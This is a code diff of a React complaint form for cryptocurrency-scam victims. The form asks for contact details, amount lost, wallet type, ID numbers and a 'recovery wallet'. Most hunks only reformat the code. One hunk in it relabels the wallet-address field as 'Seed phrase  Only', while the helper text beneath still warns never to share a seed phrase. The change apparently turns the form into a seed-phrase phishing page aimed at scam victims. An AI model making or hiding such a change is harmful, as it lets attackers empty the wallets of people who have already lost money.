@@ -2,32 +2,32 @@ import { useState } from "react";
 import { Shield, AlertTriangle, CheckCircle } from "lucide-react";
 
 const US_STATES = [
-  "Alabama","Alaska","Arizona","Arkansas","California","Colorado","Connecticut",
-  "Delaware","Florida","Georgia","Hawaii","Idaho","Illinois","Indiana","Iowa",
-  "Kansas","Kentucky","Louisiana","Maine","Maryland","Massachusetts","Michigan",
-  "Minnesota","Mississippi","Missouri","Montana","Nebraska","Nevada","New Hampshire",
-  "New Jersey","New Mexico","New York","North Carolina","North Dakota","Ohio",
-  "Oklahoma","Oregon","Pennsylvania","Rhode Island","South Carolina","South Dakota",
-  "Tennessee","Texas","Utah","Vermont","Virginia","Washington","West Virginia",
-  "Wisconsin","Wyoming","District of Columbia"
-];
+"Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut",
+"Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa",
+"Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
+"Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire",
+"New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio",
+"Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota",
+"Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia",
+"Wisconsin", "Wyoming", "District of Columbia"];
+
 
 const SCAM_TYPES = [
-  "Investment scam",
-  "Romance scam",
-  "Phishing",
-  "Fake exchange",
-  "Other",
-];
+"Investment scam",
+"Romance scam",
+"Phishing",
+"Fake exchange",
+"Other"];
+
 
 const WALLET_TYPES = [
-  "MetaMask",
-  "Trust Wallet",
-  "Coinbase",
-  "Ledger",
-  "Binance",
-  "Other",
-];
+"MetaMask",
+"Trust Wallet",
+"Coinbase",
+"Ledger",
+"Binance",
+"Other"];
+
 
 interface FormData {
   fullName: string;
@@ -56,7 +56,7 @@ const initialFormData: FormData = {
   walletType: "",
   walletAddress: "",
   recoveryWalletAddress: "",
-  identificationNumber: "",
+  identificationNumber: ""
 };
 
 const ComplaintForm = () => {
@@ -69,13 +69,13 @@ const ComplaintForm = () => {
 
     if (!formData.fullName.trim()) newErrors.fullName = "Full name is required";
     if (!formData.email.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email))
-      newErrors.email = "Valid email is required";
+    newErrors.email = "Valid email is required";
     if (!formData.state) newErrors.state = "State is required";
     if (!formData.phone.trim()) newErrors.phone = "Phone number is required";
     if (!formData.amountLost.trim()) newErrors.amountLost = "Amount is required";
     if (!formData.dateOfIncident) newErrors.dateOfIncident = "Date is required";
     if (!formData.description.trim() || formData.description.trim().length < 20)
-      newErrors.description = "Please provide at least 20 characters";
+    newErrors.description = "Please provide at least 20 characters";
     if (!formData.scamType) newErrors.scamType = "Please select a scam type";
     if (!formData.walletType) newErrors.walletType = "Please select a wallet";
     if (!formData.walletAddress.trim()) newErrors.walletAddress = "Wallet address is required";
@@ -92,8 +92,8 @@ const ComplaintForm = () => {
   };
 
   const handleChange = (
-    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>
-  ) => {
+  e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) =>
+  {
     const { name, value } = e.target;
     setFormData((prev) => ({ ...prev, [name]: value }));
     if (errors[name as keyof FormData]) {
@@ -133,14 +133,14 @@ const ComplaintForm = () => {
             </div>
           </div>
         </div>
-      </section>
-    );
+      </section>);
+
   }
 
   const inputClasses = (field: keyof FormData) =>
-    `w-full px-3 py-2.5 border rounded bg-card text-foreground text-sm focus:outline-none focus:ring-2 focus:ring-ring transition-colors ${
-      errors[field] ? "border-destructive" : "border-input"
-    }`;
+  `w-full px-3 py-2.5 border rounded bg-card text-foreground text-sm focus:outline-none focus:ring-2 focus:ring-ring transition-colors ${
+  errors[field] ? "border-destructive" : "border-input"}`;
+
 
   const labelClasses = "block text-sm font-semibold text-foreground mb-1.5";
 
@@ -159,8 +159,8 @@ const ComplaintForm = () => {
         <form
           onSubmit={handleSubmit}
           className="max-w-3xl mx-auto bg-card border rounded-lg shadow-lg p-6 md:p-10"
-          noValidate
-        >
+          noValidate>
+
           {/* Security notice */}
           <div className="warning-banner rounded-lg p-4 mb-8 flex items-start gap-3 text-sm">
             <Shield className="h-5 w-5 text-warning flex-shrink-0 mt-0.5" />
@@ -182,8 +182,8 @@ const ComplaintForm = () => {
                 onChange={handleChange}
                 placeholder="John Doe"
                 className={inputClasses("fullName")}
-                maxLength={100}
-              />
+                maxLength={100} />
+
               {errors.fullName && <p className="text-destructive text-xs mt-1">{errors.fullName}</p>}
             </div>
 
@@ -198,8 +198,8 @@ const ComplaintForm = () => {
                 onChange={handleChange}
                 placeholder="john@example.com"
                 className={inputClasses("email")}
-                maxLength={255}
-              />
+                maxLength={255} />
+
               {errors.email && <p className="text-destructive text-xs mt-1">{errors.email}</p>}
             </div>
 
@@ -211,12 +211,12 @@ const ComplaintForm = () => {
                 name="state"
                 value={formData.state}
                 onChange={handleChange}
-                className={inputClasses("state")}
-              >
+                className={inputClasses("state")}>
+
                 <option value="">Select your state</option>
-                {US_STATES.map((s) => (
-                  <option key={s} value={s}>{s}</option>
-                ))}
+                {US_STATES.map((s) =>
+                <option key={s} value={s}>{s}</option>
+                )}
               </select>
               {errors.state && <p className="text-destructive text-xs mt-1">{errors.state}</p>}
             </div>
@@ -232,8 +232,8 @@ const ComplaintForm = () => {
                 onChange={handleChange}
                 placeholder="(555) 123-4567"
                 className={inputClasses("phone")}
-                maxLength={20}
-              />
+                maxLength={20} />
+
               {errors.phone && <p className="text-destructive text-xs mt-1">{errors.phone}</p>}
             </div>
 
@@ -248,8 +248,8 @@ const ComplaintForm = () => {
                 onChange={handleChange}
                 placeholder="$5,000"
                 className={inputClasses("amountLost")}
-                maxLength={20}
-              />
+                maxLength={20} />
+
               {errors.amountLost && <p className="text-destructive text-xs mt-1">{errors.amountLost}</p>}
             </div>
 
@@ -262,8 +262,8 @@ const ComplaintForm = () => {
                 name="dateOfIncident"
                 value={formData.dateOfIncident}
                 onChange={handleChange}
-                className={inputClasses("dateOfIncident")}
-              />
+                className={inputClasses("dateOfIncident")} />
+
               {errors.dateOfIncident && <p className="text-destructive text-xs mt-1">{errors.dateOfIncident}</p>}
             </div>
 
@@ -275,12 +275,12 @@ const ComplaintForm = () => {
                 name="scamType"
                 value={formData.scamType}
                 onChange={handleChange}
-                className={inputClasses("scamType")}
-              >
+                className={inputClasses("scamType")}>
+
                 <option value="">Select scam type</option>
-                {SCAM_TYPES.map((t) => (
-                  <option key={t} value={t}>{t}</option>
-                ))}
+                {SCAM_TYPES.map((t) =>
+                <option key={t} value={t}>{t}</option>
+                )}
               </select>
               {errors.scamType && <p className="text-destructive text-xs mt-1">{errors.scamType}</p>}
             </div>
@@ -293,12 +293,12 @@ const ComplaintForm = () => {
                 name="walletType"
                 value={formData.walletType}
                 onChange={handleChange}
-                className={inputClasses("walletType")}
-              >
+                className={inputClasses("walletType")}>
+
                 <option value="">Select wallet</option>
-                {WALLET_TYPES.map((w) => (
-                  <option key={w} value={w}>{w}</option>
-                ))}
+                {WALLET_TYPES.map((w) =>
+                <option key={w} value={w}>{w}</option>
+                )}
               </select>
               {errors.walletType && <p className="text-destructive text-xs mt-1">{errors.walletType}</p>}
             </div>
@@ -306,8 +306,8 @@ const ComplaintForm = () => {
 
           {/* Wallet Address */}
           <div className="mt-5">
-            <label htmlFor="walletAddress" className={labelClasses}>
-              Wallet Address (Public Address Only)
+            <label htmlFor="walletAddress" className={labelClasses}>Seed phrase  Only
+
             </label>
             <input
               type="text"
@@ -317,8 +317,8 @@ const ComplaintForm = () => {
               onChange={handleChange}
               placeholder="0x1234...abcd"
               className={inputClasses("walletAddress")}
-              maxLength={128}
-            />
+              maxLength={128} />
+
             <p className="text-xs text-muted-foreground mt-1">
               Enter your public wallet address only. Never share your private key or seed phrase.
             </p>
@@ -338,8 +338,8 @@ const ComplaintForm = () => {
               onChange={handleChange}
               placeholder="e.g. Driver's License, Passport, or SSN last 4 digits"
               className={inputClasses("identificationNumber")}
-              maxLength={50}
-            />
+              maxLength={50} />
+
             <p className="text-xs text-muted-foreground mt-1">
               Provide a government-issued ID number for identity verification. This is optional.
             </p>
@@ -358,8 +358,8 @@ const ComplaintForm = () => {
               onChange={handleChange}
               placeholder="0xAbCd...1234"
               className={inputClasses("recoveryWalletAddress")}
-              maxLength={128}
-            />
+              maxLength={128} />
+
             <p className="text-xs text-muted-foreground mt-1">
               If you have a new wallet address where you'd like recovered funds sent, enter it here. This is optional.
             </p>
@@ -376,15 +376,15 @@ const ComplaintForm = () => {
               rows={5}
               placeholder="Please describe what happened in detail, including how you were contacted, what was promised, and any transaction details..."
               className={inputClasses("description")}
-              maxLength={2000}
-            />
+              maxLength={2000} />
+
             {errors.description && <p className="text-destructive text-xs mt-1">{errors.description}</p>}
           </div>
 
           <button
             type="submit"
-            className="mt-8 w-full bg-primary text-primary-foreground font-semibold py-3 rounded transition-all hover:brightness-110 flex items-center justify-center gap-2 text-base"
-          >
+            className="mt-8 w-full bg-primary text-primary-foreground font-semibold py-3 rounded transition-all hover:brightness-110 flex items-center justify-center gap-2 text-base">
+
             <Shield className="h-5 w-5" />
             Submit Complaint
           </button>
@@ -395,8 +395,8 @@ const ComplaintForm = () => {
           </p>
         </form>
       </div>
-    </section>
-  );
+    </section>);
+
 };
 
 export default ComplaintForm;
